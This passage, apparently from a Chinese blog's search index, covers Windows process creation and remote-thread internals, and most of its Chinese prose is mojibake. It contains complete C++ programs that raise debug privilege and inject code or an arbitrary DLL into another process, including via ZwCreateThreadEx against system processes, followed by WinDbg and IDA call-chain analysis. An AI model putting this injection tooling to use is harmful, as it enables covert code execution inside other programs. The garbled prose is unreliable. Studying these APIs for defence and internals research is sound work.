CreateProcessInternalW æœ‰ç‚¹é•¿ï¼Œæˆªå›¾çœ‹ä¸‹è°ƒç”¨å³å¯ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªå·±å»çœ‹ä¸‹ æœ‰ä»€ä¹ˆåŒºåˆ« ğŸ¤” çœ‹åˆ°è¿™é‡Œä¸ä»…è¦é—®ï¼Œä¸ºä»€ä¹ˆè¦ç»•è¿™ä¹ˆä¸€åœˆï¼Œè€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ ntdll çš„ createprocessã€‚å¯èƒ½æ˜¯ä¸ºäº†å®‰å…¨çš„å‰æä¸‹åˆèƒ½æ–¹ä¾¿è°ƒç”¨ï¼Ÿ è¡¥å……ä¸€ä¸ªä» kernel32 è°ƒç”¨ CreateProcess çš„ Demo void GetKernel32Proc() &#123; typedef BOOL WINAPI func_CreateProcessW( LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION); HMODULE kernel32 = GetModuleHandle(L&quot;kernel32.dll&quot;); if (kernel32) &#123; func_CreateProcessW* fCreateProcessW = (func_CreateProcessW*)GetProcAddress(kernel32, &quot;CreateProcessW&quot;); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); WCHAR szCommandLine[] = L&quot;calc&quot;; if (fCreateProcessW) &#123; fCreateProcessW(0, szCommandLine, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi); &#125; &#125; &#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€winapiã€‘ CreateRemoteThread å®ä¾‹ä¸è¯¦è§£","date":"2024-01-23T06:08:51.900Z","path":"A_OS/Windows/API/CreateRemoteThread/ã€winapiã€‘CreateRemoteThreadç®€å•ä½¿ç”¨/","text":"æ¦‚è¿°ï¼šCreateRemoteThread çš„ç®€å•ä½¿ç”¨ Demo åœ¨é˜…è¯»ä¹‹å‰ï¼Œå»ºè®®å¤§å®¶å¸¦ç€å‡ ä¸ªé—®é¢˜ 0x01è¯´æ˜ æ‰“å¼€ä¸€ä¸ª GUI è¿›ç¨‹ï¼Œå¹¶åœ¨è¿›ç¨‹ä¸­è°ƒç”¨ MessageBox å¼¹å‡ºæ¶ˆæ¯æ¡†ã€‚ å…³é”®è¯´æ˜ï¼šç”±äºæ³¨å…¥åªèƒ½ä¼ é€’ä¸€ä¸ªå‚æ•°ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥åœ¨ç›®æ ‡è¿›ç¨‹ä¸­è°ƒç”¨ MessageBox. å› æ­¤è‡³å°‘éœ€è¦åˆ›å»ºä¸€ä¸ªåªæœ‰ä¸€ä¸ªå…¥å‚çš„å‡½æ•°æ¥ä¼ é€’ MessageBox çš„ç›¸å…³è°ƒç”¨ã€‚ æ­¥éª¤è¯´æ˜ï¼š æ ¹æ®ä¼ é€’çš„è¿›ç¨‹åè·å–è¿›ç¨‹ PID æ ¹æ® PID æ‰“å¼€ç›®æ ‡è¿›ç¨‹ ç”³è¯·å†…å­˜å†™å…¥è°ƒç”¨å‡½æ•°çš„åœ°å€ ç”³è¯·å†…å­˜å†™å…¥è°ƒç”¨å‡½æ•°çš„å‚æ•° åˆ›å»ºè¿œç¨‹çº¿ç¨‹è°ƒç”¨å†™å…¥çš„å‡½æ•° 0x02ä»£ç  è°ƒç”¨ CreateRemoteThread 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#pragma once#include &lt;windows.h&gt; #include &lt;TlHelp32.h&gt; #include &quot;stdio.h&quot; //çº¿ç¨‹å‚æ•°ç»“æ„ä½“å®šä¹‰ typedef struct _RemoteParam &#123; char szMsg[12]; //MessageBoxå‡½æ•°ä¸­æ˜¾ç¤ºçš„å­—ç¬¦æç¤º DWORD dwMessageBox;//MessageBoxå‡½æ•°çš„å…¥å£åœ°å€ &#125; RemoteParam, * PRemoteParam;//å®šä¹‰MessageBoxç±»å‹çš„å‡½æ•°æŒ‡é’ˆ typedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCTSTR, LPCTSTR, DWORD);//çº¿ç¨‹å‡½æ•°å®šä¹‰ DWORD __stdcall threadProc(LPVOID lParam)&#123; RemoteParam* pRP = (RemoteParam*)lParam; PFN_MESSAGEBOX pfnMessageBox; pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox; pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0); return 0;&#125;//æå‡è¿›ç¨‹è®¿é—®æƒé™ bool enableDebugPriv()&#123; HANDLE hToken; LUID sedebugnameValue; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123; return false; &#125; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) &#123; CloseHandle(hToken); return false; &#125; tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = sedebugnameValue; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) &#123; CloseHandle(hToken); return false; &#125; return true;&#125;//æ ¹æ®è¿›ç¨‹åç§°å¾—åˆ°è¿›ç¨‹ID,å¦‚æœæœ‰å¤šä¸ªè¿è¡Œå®ä¾‹çš„è¯ï¼Œè¿”å›ç¬¬ä¸€ä¸ªæšä¸¾åˆ°çš„è¿›ç¨‹çš„ID DWORD processNameToId(LPCTSTR lpszProcessName)&#123; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hSnapshot, &amp;pe)) &#123; MessageBox(NULL, &quot;The frist entry of the process list has not been copyied to the buffer&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; while (Process32Next(hSnapshot, &amp;pe)) &#123; if (!strcmp(lpszProcessName, pe.szExeFile)) &#123; return pe.th32ProcessID; &#125; &#125; return 0;&#125;int main(int argc, char* argv[])&#123; //å®šä¹‰çº¿ç¨‹ä½“çš„å¤§å° const DWORD dwThreadSize = 4096; DWORD dwWriteBytes; //æå‡è¿›ç¨‹è®¿é—®æƒé™ enableDebugPriv(); char* szExeName = (char*)&quot;calc.exe&quot;; DWORD dwProcessId = processNameToId(szExeName); if (dwProcessId == 0) &#123; MessageBox(NULL, &quot;The target process have not been found !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return -1; &#125; //æ ¹æ®è¿›ç¨‹IDå¾—åˆ°è¿›ç¨‹å¥æŸ„ HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hTargetProcess) &#123; MessageBox(NULL, &quot;Open target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; //åœ¨å®¿ä¸»è¿›ç¨‹ä¸­ä¸ºçº¿ç¨‹ä½“å¼€è¾Ÿä¸€å—å­˜å‚¨åŒºåŸŸ //åœ¨è¿™é‡Œéœ€è¦æ³¨æ„MEM_COMMIT | MEM_RESERVEå†…å­˜éé…ç±»å‹ä»¥åŠPAGE_EXECUTE_READWRITEå†…å­˜ä¿æŠ¤ç±»å‹ //å…¶å…·ä½“å«ä¹‰è¯·å‚è€ƒMSDNä¸­å…³äºVirtualAllocExå‡½æ•°çš„è¯´æ˜ã€‚ void* pRemoteThread = VirtualAllocEx(hTargetProcess, 0, dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!pRemoteThread) &#123; MessageBox(NULL, &quot;Alloc memory in target process failed !&quot;, &quot;notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; //å°†çº¿ç¨‹ä½“æ‹·è´åˆ°å®¿ä¸»è¿›ç¨‹ä¸­ if (!WriteProcessMemory(hTargetProcess, pRemoteThread, &amp;threadProc, dwThreadSize, 0)) &#123; MessageBox(NULL, &quot;Write data to target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; //å®šä¹‰çº¿ç¨‹å‚æ•°ç»“æ„ä½“å˜é‡ RemoteParam remoteData; ZeroMemory(&amp;remoteData, sizeof(RemoteParam)); //å¡«å……ç»“æ„ä½“å˜é‡ä¸­çš„æˆå‘˜ HINSTANCE hUser32 = LoadLibrary(&quot;User32.dll&quot;); remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;); strcat_s(remoteData.szMsg, &quot;Helloï¼¼0&quot;); //ä¸ºçº¿ç¨‹å‚æ•°åœ¨å®¿ä¸»è¿›ç¨‹ä¸­å¼€è¾Ÿå­˜å‚¨åŒºåŸŸ RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx( hTargetProcess, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE); if (!pRemoteParam) &#123; MessageBox(NULL, &quot;Alloc memory failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; //å°†çº¿ç¨‹å‚æ•°æ‹·è´åˆ°å®¿ä¸»è¿›ç¨‹åœ°å€ç©ºé—´ä¸­ if (!WriteProcessMemory(hTargetProcess, pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) &#123; MessageBox(NULL, &quot;Write data to target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; //åœ¨å®¿ä¸»è¿›ç¨‹ä¸­åˆ›å»ºçº¿ç¨‹ HANDLE hRemoteThread = CreateRemoteThread( hTargetProcess, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread, pRemoteParam, 0, &amp;dwWriteBytes); if (!hRemoteThread) &#123; MessageBox(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; CloseHandle(hRemoteThread); FreeLibrary(hUser32); return 0;&#125; è°ƒç”¨ ZwCreateThreadEx 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192//////////////////////////////////// FileName : KernelFuncInject.cpp// Creator : PeterZheng// Date : 2019/01/10 21:32// Comment : Use Kernel Function To Inject//////////////////////////////////#pragma once#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;strsafe.h&gt;#include &lt;Windows.h&gt;#include &lt;TlHelp32.h&gt;#ifdef _WIN64typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#elsetypedef DWORD(WINAPI *typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endifusing namespace std;// ææƒå‡½æ•°BOOL EnableDebugPriv(LPCSTR name)&#123; HANDLE hToken; LUID luid; TOKEN_PRIVILEGES tp; // æ‰“å¼€è¿›ç¨‹ä»¤ç‰Œ if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123; printf(&quot;[!]Get Process Token Error!\\n&quot;); return false; &#125; // è·å–æƒé™Luid if (!LookupPrivilegeValue(NULL, name, &amp;luid)) &#123; printf(&quot;[!]Get Privilege Error!\\n&quot;); return false; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // ä¿®æ”¹è¿›ç¨‹æƒé™ if (!AdjustTokenPrivileges(hToken, false, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) &#123; printf(&quot;[!]Adjust Privilege Error!\\n&quot;); return false; &#125; return true;&#125;// æ ¹æ®è¿›ç¨‹åå­—è·å–è¿›ç¨‹IdBOOL GetProcessIdByName(CHAR *szProcessName, DWORD&amp; dwPid)&#123; HANDLE hSnapProcess = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapProcess == NULL) &#123; printf(&quot;[*] Create Process Snap Error!\\n&quot;); return FALSE; &#125; PROCESSENTRY32 pe32 = &#123; 0 &#125;; ::RtlZeroMemory(&amp;pe32, sizeof(pe32)); pe32.dwSize = sizeof(pe32); BOOL bRet = ::Process32First(hSnapProcess, &amp;pe32); while (bRet) &#123; if (_stricmp(pe32.szExeFile, szProcessName) == 0) &#123; dwPid = pe32.th32ProcessID; return TRUE; &#125; bRet = ::Process32Next(hSnapProcess, &amp;pe32); &#125; return FALSE;&#125;int main(int argc, char* argv[])&#123; if (argc != 3) &#123; printf(&quot;[*] Format Error! \\nYou Should FOLLOW THIS FORMAT: &lt;APCInject EXENAME DLLNAME&gt; \\n&quot;); return 0; &#125; LPSTR szExeName = (LPSTR)::VirtualAlloc(NULL, 100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); LPSTR szDllPath = (LPSTR)::VirtualAlloc(NULL, 100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); ::RtlZeroMemory(szExeName, 100); ::RtlZeroMemory(szDllPath, 100); ::StringCchCopy(szExeName, 100, argv[1]); ::StringCchCopy(szDllPath, 100, argv[2]); DWORD dwPid = 0; // ç³»ç»Ÿè¿›ç¨‹å¿…é¡»å…ˆææƒæ‰èƒ½æ‰“å¼€ï¼Œå¦åˆ™åœ¨OpenProcessæ­¥éª¤ä¼šå¤±è´¥ EnableDebugPriv(SE_DEBUG_NAME); BOOL bRet = GetProcessIdByName(szExeName, dwPid); if (!bRet) &#123; printf(&quot;[*] Get Process Id Error!\\n&quot;); return 0; &#125; HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if (hProcess == NULL) &#123; printf(&quot;[*] Open Process Error!\\n&quot;); return 0; &#125; DWORD dwDllPathLen = strlen(szDllPath) + 1; LPVOID lpBaseAddress = ::VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (lpBaseAddress == NULL) &#123; printf(&quot;[*] VirtualAllocEx Error!\\n&quot;); return 0; &#125; SIZE_T dwWriten = 0; // æŠŠDLLè·¯å¾„å­—ç¬¦ä¸²å†™å…¥ç›®æ ‡è¿›ç¨‹ ::WriteProcessMemory(hProcess, lpBaseAddress, szDllPath, dwDllPathLen, &amp;dwWriten); if (dwWriten != dwDllPathLen) &#123; printf(&quot;[*] Write Process Memory Error!\\n&quot;); return 0; &#125; // è·å–LoadLibraryå‡½æ•°åœ°å€ LPVOID pLoadLibraryFunc = ::GetProcAddress(::GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if (pLoadLibraryFunc == NULL) &#123; printf(&quot;[*] Get Func Address Error!\\n&quot;); return 0; &#125; HMODULE hNtdll = ::LoadLibrary(&quot;ntdll.dll&quot;); if (hNtdll == NULL) &#123; printf(&quot;[*] Load NtDLL Error!\\n&quot;); return 0; &#125; typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdll, &quot;ZwCreateThreadEx&quot;); if (ZwCreateThreadEx == NULL) &#123; printf(&quot;[*] Get NTDLL Func Address Error!\\n&quot;); return 0; &#125; DWORD dwStatus = 0; HANDLE hRemoteThread = NULL; dwStatus = ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pLoadLibraryFunc, lpBaseAddress, 0, 0, 0, 0, NULL); if (hRemoteThread == NULL) &#123; printf(&quot;[*] Create Remote Thread Error!\\n&quot;); return 0; &#125; // DLLè·¯å¾„åˆ†å‰²ï¼Œæ–¹ä¾¿è¾“å‡º LPCSTR szPathSign = &quot;\\\\&quot;; LPSTR p = NULL; LPSTR next_token = NULL; p = strtok_s(szDllPath, szPathSign, &amp;next_token); while (p) &#123; StringCchCopy(szDllPath, 100, p); p = strtok_s(NULL, szPathSign, &amp;next_token); &#125; printf(&quot;[*] High Privilege Inject Info [%s ==&gt; %s] Success\\n&quot;, szDllPath, szExeName); ::CloseHandle(hProcess); ::FreeLibrary(hNtdll); ::VirtualFree(szExeName, 0, MEM_RELEASE); ::VirtualFree(szDllPath, 0, MEM_RELEASE); ::ExitProcess(0); return 0;&#125; ZwCreateThreadEx åˆ†æ ZwCreateThreadEx å±äº native å‡½æ•°ï¼Œå¾®è½¯å®˜æ–¹å¹¶æ²¡æœ‰ç»™å‡ºç›¸å…³æ–‡æ¡£ï¼Œæœ¬å°èŠ‚åˆ†æå†…å®¹å‚è€ƒæœ¬æ–‡å¼•ç”¨æ–‡ç« ã€‚ 12345678910111213141516NTSTATUS ZwCreateThreadEx( OUT PHANDLE ThreadHandle, //è¾“å‡ºå‚æ•°ï¼Œæ–°åˆ›å»ºçš„çº¿ç¨‹çš„å¥æŸ„ã€‚ IN ACCESS_MASK DesiredAccess, //æ‰€éœ€çš„è®¿é—®æƒé™æ ‡å¿—ï¼Œä¾‹å¦‚PROCESS_ALL_ACCESSä»£è¡¨å…¨éƒ¨æƒé™ IN PVOID ObjectAttributes, //å¯¹è±¡çš„å±æ€§ï¼Œé€šå¸¸ä¸ºNULLã€‚ IN HANDLE ProcessHandle, //æ‰€åˆ›å»ºçº¿ç¨‹å°†è¦åœ¨å…¶å†…è¿è¡Œçš„è¿›ç¨‹çš„å¥æŸ„ IN PTHREAD_START_ROUTINE StartRoutine, //æ–°çº¿ç¨‹çš„å¼€å§‹åœ°å€ IN PVOID Argument, //è¦ä¼ é€’ç»™æ–°çº¿ç¨‹çš„å‚æ•° IN ULONG CreateFlags, //è¦ä¼ é€’ç»™æ–°çº¿ç¨‹çš„å‚æ•° //ZeroBits, StackSize, MaximumStackSize: è¿™äº›å‚æ•°ä¸€èˆ¬è®¾ç½®ä¸º0ï¼Œè¡¨ç¤ºä½¿ç”¨é»˜è®¤çš„å †æ ˆå¤§å° IN ULONG_PTR ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList //ç”¨äºä¼ é€’æ›´é«˜çº§çš„çº¿ç¨‹å±æ€§ï¼Œé€šå¸¸è®¾ç½®ä¸ºNULL); åŒºåˆ†32ä½å’Œ64ä½æ“ä½œç³»ç»Ÿï¼š 123456789101112131415161718192021222324252627#ifdef _WIN64typedef DWORD(WINAPI* Fn_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#elsetypedef DWORD(WINAPI* Fn_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endif 0x03 CreateRemoteThread å‡½æ•°è°ƒç”¨åˆ†æ å¦‚ä¸‹æ‰€ç¤ºä¸ºä¸Šè¿°ä»£ç åœ¨è°ƒç”¨ CreateRemoteThread ä¹‹åçš„å †æ ˆæƒ…å†µã€‚ 12345[0x0] ntdll!NtCreateThreadEx 0x57f524 0x77809a17 [0x1] KERNELBASE!CreateRemoteThreadEx+0x1e7 0x57f528 0x774b2e38 [0x2] KERNEL32!CreateRemoteThreadStub+0x28 0x57f81c 0x5a2c7a [0x3] DllInject!main+0x37a 0x57f844 0x5a36d3 [0x4] DllInject!invoke_main+0x33 0x57f998 0x5a3527 é€šè¿‡WinDbgæŸ¥çœ‹å‡½æ•° CreateRemoteThead åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹çš„è°ƒç”¨æµç¨‹ï¼Œè§‚å¯Ÿè¿™ä¸ªè°ƒç”¨æƒ…å†µå¯ä»¥ç¡®å®šåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œè¿™ä¸ªå‡½æ•°æ¶‰åŠåˆ°äº†ä¸‰ä¸ªdllæ¨¡å—ï¼ˆKERNEL32ã€KERNELBASEã€ntdllï¼‰ã€‚è€Œ CreateRemoteThead è¿™ä¸ªAPIåœ¨KERNEL32æ¨¡å—ä¸­çœŸæ­£çš„å‡½æ•°åæ˜¯ CreateRemoteThreadStub ï¼Œé€šè¿‡è¿™ä¸ªKERNEL32ä¸­çš„ CreateRemoteThreadStub APIå°†å‚æ•°è½¬å‘åˆ°KERNELBASE æ¨¡å—ä¸­çš„ CreateRemoteThreadEx ä¸­ï¼Œç„¶ååœ¨ KERNELBASE ä¸­è°ƒç”¨ntdllæ¨¡å—ä¸­çš„ NtCreateThreadEx APIï¼Œè¿›å…¥å†…æ ¸ã€‚å¾…å†…æ ¸å¤„ç†ç»“æŸåè·å–è¿”å›å€¼ï¼Œè¿›è¡Œè¿”å›å€¼çš„å¤„ç†å¹¶è¿”å›ç»“æœã€‚ ç³»ç»Ÿè°ƒç”¨ä»¥åŠ SSDT(System Service Descriptor Table)æ–‡ç« æ¨èï¼šå¼ºçƒˆå»ºè®®å¯ä»¥é˜…è¯»è¿™ç¯‡æ–‡ç«  Windows-Internals/System Architecture and Components/System Service Descriptor Table.md at main Â· Faran-17/Windows-Internals å‡½æ•°è¯´æ˜ æ ¹æ®ä¸Šè¿°å·²ç»æœ‰çš„å †æ ˆï¼Œç»“åˆ IDA æŸ¥çœ‹ä¸‹å‡½æ•°è°ƒç”¨ã€‚ CreateRemoteThreadStub å¦‚ä¸‹æ‰€ç¤ºï¼Œä¸º CreateRemoteThreadStub æ±‡ç¼–å’Œåæ±‡ç¼–çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ CreateRemoteThreadStub ä¸­å¢åŠ äº†ä¸€ä¸ªå‚æ•°ï¼Œå¹¶ä¸” dwCreationFlags å‚æ•°è¿›è¡Œäº†æ ¡éªŒï¼Œä¸æ ‡è®° 0x1004 è¿›è¡Œä¸æ“ä½œï¼Œè§„é¿äº†æ— æ•ˆå‚æ•°ï¼Œå«ä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼Œè€Œä¹Ÿå°±æ˜¯å¢åŠ çš„å‚æ•°ï¼Œä¼šå­˜åœ¨æ³¨å…¥çš„dllä¸å¯åŠ¨çš„æƒ…å†µã€‚ å€¼ å«ä¹‰ 0 çº¿ç¨‹åœ¨åˆ›å»ºåç«‹å³è¿è¡Œã€‚ CREATE_SUSPENDED0x00000004 çº¿ç¨‹ä»¥æŒ‚èµ·çŠ¶æ€åˆ›å»ºï¼Œåœ¨è°ƒç”¨ ResumeThread å‡½æ•°ä¹‹å‰ä¸ä¼šè¿è¡Œã€‚ STACK_SIZE_PARAM_IS_A_RESERVATION 0x00010000 dwStackSize å‚æ•°æŒ‡å®šå †æ ˆçš„åˆå§‹ä¿ç•™å¤§å°ã€‚ å¦‚æœæœªæŒ‡å®šæ­¤æ ‡å¿—ï¼Œ dwStackSize å°†æŒ‡å®šæäº¤å¤§å°ã€‚ CreateRemoteThreadEx CreateRemoteThreadå‡½æ•°ä½äºKernelBase.dllä¸­ï¼Œæœ€ç»ˆè°ƒç”¨äº†NtCreateThreadExå‡½æ•° å¦‚ä¸‹æ‰€ç¤ºä¸ºåæ±‡ç¼–çš„ CreateRemoteThreadEx å‡½æ•°ã€‚ è¿™é‡Œå¯ä»¥å…³æ³¨ä¸‹ç¬¬ä¸ƒä¸ªå‚æ•°ï¼Œå§‹ç»ˆä¸º 1ï¼Œè¿™ä¸ªå‚æ•°è¡¨ç¤ºåˆ›å»ºçš„çº¿ç¨‹å§‹ç»ˆä¸ºæŒ‚èµ·çŠ¶æ€ã€‚å‚è€ƒï¼šå®‰å…¨ä¹‹è·¯ â€”â€” åˆ©ç”¨å†…æ ¸å‡½æ•°å®ç°æ³¨å…¥ç³»ç»Ÿè¿›ç¨‹ - å€šå‰‘é—®å¤© - åšå®¢å›­ å‡½æ•°åŸå‹ï¼š 12345678910111213141516NTSYSCALLAPINTSTATUSNTAPINtCreateThreadEx( _Out_ PHANDLE ThreadHandle, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE ProcessHandle, _In_ PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE _In_opt_ PVOID Argument, _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_* _In_ SIZE_T ZeroBits, _In_ SIZE_T StackSize, _In_ SIZE_T MaximumStackSize, _In_opt_ PPS_ATTRIBUTE_LIST AttributeList); NtCreateThreadEx è¿™é‡Œå…ˆè¡¥å……ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œ``NtCreateThreadä¸ZwCreateThread çš„å‡½æ•°åœ°å€æ˜¯ä¸€æ ·çš„ï¼ŒNtCreateThreadExä¸ZwCreateThreadExçš„å‡½æ•°åœ°å€æ˜¯ä¸€æ ·çš„ã€‚åŒºåˆ«å°±æ˜¯ Nt çš„ä¸ºç”¨æˆ·å±‚å‡½æ•°ï¼Œç”¨æˆ·æ€è°ƒç”¨æ—¶ä¼šä½¿ç”¨ Nt å¼€å¤´çš„ï¼ŒZw å¼€å¤´çš„ä¼šåœ¨å†…æ ¸è°ƒç”¨ã€‚ å¯ä»¥åˆ©ç”¨ZwCreateThread` å®ç°ç³»ç»Ÿè¿›ç¨‹æ³¨å…¥ã€‚å‰æ–‡æœ‰[ç›¸å…³ä»£ç ](#è°ƒç”¨ ZwCreateThreadEx). ç”¨æˆ·æ€ä¸€èˆ¬ä¸ä¼šç›´æ¥è°ƒç”¨è¿™ä¸ªæ¥å£ æ±‡ç¼–è¯´æ˜ï¼š mov eax, 0C7hï¼šå°†å€¼0c7hç§»åŠ¨è‡³eaxå¯„å­˜å™¨ï¼Œè¡¨ç¤ºæ‰§è¡Œç¼–å·ä¸º0c7hçš„ç³»ç»Ÿè°ƒç”¨ syscallï¼šè¿™æ˜¯æ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„æŒ‡ä»¤ã€‚ç³»ç»Ÿè°ƒç”¨ç¼–å·å’Œå‚æ•°åº”åœ¨æ­¤ä¹‹å‰å·²è¢«è®¾ç½®å¥½ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé€šè¿‡å°† 0xC7 å’Œ rcx çš„å†…å®¹ç§»åŠ¨åˆ° eax å’Œ r10ï¼‰ è¿™æ®µä»£ç è¡¨ç¤ºæ‰§è¡Œç¼–å·ä¸º 0xC7 çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚æœ ds:7FFE0308h çš„æœ€ä½ä½è¢«è®¾ç½®ï¼Œé‚£ä¹ˆåœ¨ç³»ç»Ÿè°ƒç”¨å‰ä¼šå…ˆè·³è½¬åˆ°å¦ä¸€æ®µä»£ç ï¼ˆä½äº loc_1800A0525ï¼Œä½¿ç”¨int 2Ehä¸­æ–­è¿›å…¥å†…æ ¸ï¼‰ã€‚å¦‚æœè¯¥ä½æœªè¢«è®¾ç½®ï¼Œé‚£ä¹ˆç›´æ¥æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ å¯ä»¥ç»“åˆåæ±‡ç¼–ä»£ç æŸ¥çœ‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011__int64 NtCreateThreadEx()&#123; __int64 result; // rax result = 194i64; if ( (MEMORY[0x7FFE0308] &amp; 1) != 0 ) // æŸ¥çœ‹æ ‡å¿—ä½ __asm &#123; int 2Eh; DOS 2+ internal - EXECUTE COMMAND &#125; else __asm &#123; syscall; Low latency system call &#125; return result;&#125; æ€»ç»“ ä»¥ä¸‹æ˜¯CreateRemoteThreadå‡½æ•°çš„è°ƒç”¨æµç¨‹å›¾ åº”ç”¨ç¨‹åºè°ƒç”¨ CreateRemoteThreadï¼Œè¿™æ˜¯ä¸€ä¸ªç”± kernel32.dll æä¾›çš„ Win32 APIï¼Œç”¨äºåœ¨å¦ä¸€ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­åˆ›å»ºæ–°çº¿ç¨‹ã€‚ CreateRemoteThread å†…éƒ¨è°ƒç”¨ 